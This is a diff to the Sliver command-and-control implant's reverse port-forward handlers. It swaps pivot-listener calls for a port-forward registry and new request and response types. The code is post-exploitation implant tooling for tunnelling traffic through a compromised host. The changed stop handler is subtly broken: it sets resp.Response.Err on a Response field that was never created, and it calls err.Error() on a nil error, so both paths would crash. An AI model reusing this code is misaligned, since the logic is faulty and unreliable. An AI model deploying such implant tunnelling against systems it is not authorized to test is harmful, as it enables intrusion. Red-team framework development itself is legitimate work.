@@ -21,12 +21,10 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
-	"strconv"
 	"time"
 
 	// {{end}}
 
-	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	rportfwd "github.com/bishopfox/sliver/implant/sliver/rportfwd"
 	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -89,12 +87,12 @@ func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.
 	tcpProxy := &tcpproxy.Proxy{}
 	channelProxy := &rportfwd.ChannelProxy{
 		Conn:            connection,
-		RemoteAddr:      req.ForwardAddress + ":" + strconv.Itoa((int)(req.ForwardPort)),
-		BindAddr:        req.BindAddress + ":" + strconv.Itoa((int)(req.BindPort)),
+		RemoteAddr:      req.ForwardAddress,
+		BindAddr:        req.BindAddress,
 		KeepAlivePeriod: 60 * time.Second,
 		DialTimeout:     30 * time.Second,
 	}
-	tcpProxy.AddRoute(req.BindAddress+":"+strconv.Itoa((int)(req.BindPort)), channelProxy)
+	tcpProxy.AddRoute(req.BindAddress, channelProxy)
 	rportfwd := rportfwd.Portfwds.Add(tcpProxy, channelProxy)
 
 	go func() {
@@ -119,8 +117,8 @@ func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.
 }
 
 func rportFwdStopListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
-	req := &pb.PivotStopListenerReq{}
-	resp := &pb.PivotListener{Response: &commonpb.Response{}}
+	req := &pb.RportFwdStopListenerReq{}
+	resp := &pb.RportFwdListener{}
 	err := proto.Unmarshal(envelope.Data, req)
 	if err != nil {
 		resp.Response.Err = err.Error()
@@ -131,10 +129,18 @@ func rportFwdStopListenerHandler(envelope *pb.Envelope, connection *transports.C
 		}
 		return
 	}
-	pivots.StopListener(req.ID)
-	pivots.RemoveListener(req.ID)
+
+	res := rportfwd.Portfwds.Remove(int(req.ID))
+	if res == true {
+		resp.ID = req.ID
+	} else {
+		resp.Response.Err = err.Error()
+	}
+
+	data, _ := proto.Marshal(resp)
 	connection.Send <- &pb.Envelope{
 		ID:   envelope.ID,
-		Data: []byte{},
+		Data: data,
 	}
+	return
 }
